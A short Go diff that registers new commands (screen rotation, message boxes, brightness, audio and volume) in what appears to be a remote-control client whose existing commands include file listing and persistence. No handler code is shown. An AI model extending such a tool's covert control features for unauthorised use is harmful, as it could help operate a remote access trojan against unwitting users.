@@ -27,4 +27,9 @@ func registerCommands() {
 	commandsList["tree"] = &commands.TreeCommand{}
 	commandsList["file"] = &commands.FileCommand{}
 	commandsList["persist"] = &commands.PersistCommand{}
+	commandsList["rotate"] = &commands.RotateCommand{}
+	commandsList["msgbox"] = &commands.NotifCommand{}
+	commandsList["brightness"] = &commands.LightCommand{}
+	commandsList["audio"] = &commands.AudioCommand{}
+	commandsList["volume"] = &commands.VolumeCommand{}
 }
